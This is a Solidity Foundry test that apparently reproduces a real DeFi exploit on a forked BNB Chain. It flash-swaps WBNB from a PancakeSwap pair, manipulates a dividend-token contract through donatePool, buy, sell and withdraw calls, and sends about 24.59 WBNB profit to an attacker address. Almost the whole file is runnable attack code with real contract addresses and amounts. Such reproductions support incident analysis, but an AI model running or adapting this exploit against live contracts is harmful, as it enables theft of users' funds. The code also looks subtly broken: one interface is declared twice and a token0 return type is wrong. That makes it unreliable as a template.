
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 51715417;
    uint256 constant TX_TIMESTAMP = 1750317290;
    uint256 constant TX_BLOCK_NUMBER = 51715418;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 24586528993752124174);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(2)),
                bytes32(uint256(993001398177889872376636406357334097450622680142))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1069295261705322660692659746119710186699350608220))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(129738083488189626618835655285048609293791333806))
            );
        IERC20Like(Addresses.WBNB).approve(Addresses.A_ADEFB9_7C4E, type(uint256).max);
        ICake_LP(Addresses.Cake_LP).token0();
        IUniswapV2PairLike(Addresses.Cake_LP).swap(0, 2000000000000000000000, address(this), hex"3030");
        uint256 wbnbBalanceOfAttackAttackContract = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, wbnbBalanceOfAttackAttackContract);
    }

    function _callback() internal {
        _markCallback(1);
        IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).donatePool(1000000000000000000000);
        uint256 aAdefb97c4eBuyReturn = IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).buy(240000000000000000000);
        uint256 aAdefb97c4eMyTokensReturn = IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).myTokens();
        IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).sell(aAdefb97c4eMyTokensReturn);
        IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).myDividends();
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.A_ADEFB9_7C4E);
        uint256 wbnbTransferAmount = 94064984776383565540;
        IERC20Like(Addresses.WBNB).transfer(Addresses.A_ADEFB9_7C4E, wbnbTransferAmount);
        IContract_ADEFB9_7C4E(Addresses.A_ADEFB9_7C4E).withdraw();
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, 2005200000000000000000);

            Harness.vmExt().stopPrank();
        }
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x227636c0) {
            _attack();
            return;
        }
        if (msg.sig == 0x84800812) {
            _callback();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attacker_eoa = 0x2deA406bb3bEa68d6be8D9Ef0071FDf63082Fb52;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_ADEFB9_7C4E = 0xAdEfb902CaB716B8043c5231ae9A50b8b4eE7c4e;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_contract = 0xE63a5C681caCB8484c8A989CfDd41b8E3B7a2be2;
}

interface ICake_LP {
    function token0() external view returns (uint256);
}

interface IContract_ADEFB9_7C4E {
    function buy(uint256) external returns (uint256);
    function donatePool(uint256) external returns (uint256);
    function myDividends() external view returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(uint256) external;
    function withdraw() external;
    function buy() external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
